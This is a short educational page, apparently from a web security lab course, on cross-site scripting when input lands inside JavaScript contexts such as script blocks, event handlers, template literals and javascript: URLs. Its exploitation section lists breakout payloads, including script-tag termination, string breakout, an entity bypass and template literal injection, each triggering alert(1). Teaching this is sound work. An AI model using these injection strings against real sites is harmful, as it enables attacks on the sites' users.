# XSS in JavaScript Context

## Overview

XSS vulnerabilities become more challenging when user input is reflected inside existing JavaScript code rather than normal HTML.

Example:

```html
<script>

var searchTerms = 'USER_INPUT';

</script>
```

In this situation, traditional payloads such as:

```html
<script>alert(1)</script>
```

may not work directly.

Instead, attackers need to understand:

```text
JavaScript Context
        ↓
Current Syntax
        ↓
Breakout Technique
        ↓
Payload Execution
```

---

# Why JavaScript Context Is Different

Unlike HTML Context:

```html
<p>USER_INPUT</p>
```

the browser has already entered:

```javascript
JavaScript Parsing Mode
```

Therefore:

```text
Payload Must Produce Valid JavaScript
```

---

# Common JavaScript Contexts

## Script Block

```html
<script>

var input = 'USER_INPUT';

</script>
```

---

## Event Handler

```html
<a onclick="var x='USER_INPUT'">
```

---

## Template Literal

```javascript
var input = `USER_INPUT`;
```

---

## JavaScript URL

```html
<a href="javascript:USER_INPUT">
```

---

# Common Exploitation Techniques

### Terminating Existing Script

```html
</script><script>alert(1)</script>
```

---

### Breaking Out Of String

```javascript
';alert(1)//
```

---

### HTML Entity Bypass

```html
&apos;;alert(1);//
```

---

### Template Literal Injection

```javascript
${alert(1)}
```

---

# Related Labs

- Lab18
- Lab19
- Lab20
- Lab21
- Lab22
- Lab23

---

# Key Takeaways

- JavaScript Context requires syntax awareness.
- Understanding parsing behavior is critical.
- Context determines payload selection.